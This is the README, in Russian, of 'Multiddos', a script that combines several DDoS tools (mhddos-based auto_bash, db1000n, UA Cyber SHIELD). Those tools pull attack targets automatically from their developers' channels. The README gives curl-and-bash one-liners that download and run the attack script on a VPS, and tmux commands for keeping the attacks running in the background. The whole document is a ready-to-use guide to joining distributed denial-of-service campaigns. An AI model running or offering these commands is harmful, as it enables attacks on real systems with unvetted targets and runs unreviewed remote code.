## Multiddos - скрипт объединяющий в себе несколько утилит для ddos.
Идея состоит в том, чтобы автоматизировать сразу нескольких утилит, объединить несколько групп в более массированные атаки, а также просто не давать простаивать свободным ресурсам на VPS.

![multiddos](https://user-images.githubusercontent.com/53382906/161972523-a1197762-a166-45f2-9b68-6e13cc940d99.gif)

На данный момент скрипт запускает:
* [auto_bash](https://github.com/Aruiem234/auto_mhddos/tree/main/bash) от Украинского Жнеца ([канал](https://t.me/ukrainian_reaper_ddos), [чат](https://t.me/+azRzzKp-STpkMjNi))
* [db1000n ](https://github.com/Arriven/db1000n) от IT ARMY of Ukraine ([канал](https://t.me/itarmyofukraine2022), чат)
* [UA Cyber SHIELD](https://github.com/opengs/uashield) ([канал](https://t.me/uashield), чат)

Все эти утилиты автоматизированы, то есть автоматически подтягивают новые цели от своих разработчиков.

## Команда для запуска в Linux

```
curl -s https://raw.githubusercontent.com/KarboDuck/multiddos/main/multiddos.sh -o multiddos.sh && bash multiddos.sh
```

Скрипт запускает tmux сессию. Если ssh сессия оборвется, то программы не закроются, а будут дальше работать в фоне. После повторного подключения по ssh окно Tmux можно восстановить.

В окне запускается gotop (можно смотреть за исходящим трафиком, нагрузкой на процессор, и использование RAM).
И несколько утилит, перечисленных ранее. 

<details>
  <summary>Версия с матрицей, по просьбам трудящихся</summary>
  
Отличается только наличием cmatrix.
```
curl -s https://raw.githubusercontent.com/KarboDuck/multiddos/main/multiddos_matrix.sh -o multiddos_m.sh && bash multiddos_m.sh
```
![cmatrix](https://user-images.githubusercontent.com/53382906/162016355-5062d73e-16a1-4311-8090-14e24b696304.gif)
  
</details>


## Управление

* Свернуть Tmux. Программы продолжат работать в фоне, и к сессии можно будет снова подключиться.

`Нажмите Ctrl +b и отпустите` `Нажмите d`
* Закрыть сессию Tmux.

Сначала выйдите из Tmux: `Нажмите Ctrl +b и отпустите` `Нажмите d`

Выполните в терминале команду `tmux kill-session -t multiddos`
* Переподключиться к сессии Tmux.

Если у вас всего одна сессия Tmux, то используйте: `tmux a` (tmux attach)

Если у вас несколько сессий, подключайтесь по имени: `tmux attach-session -t multiddos`
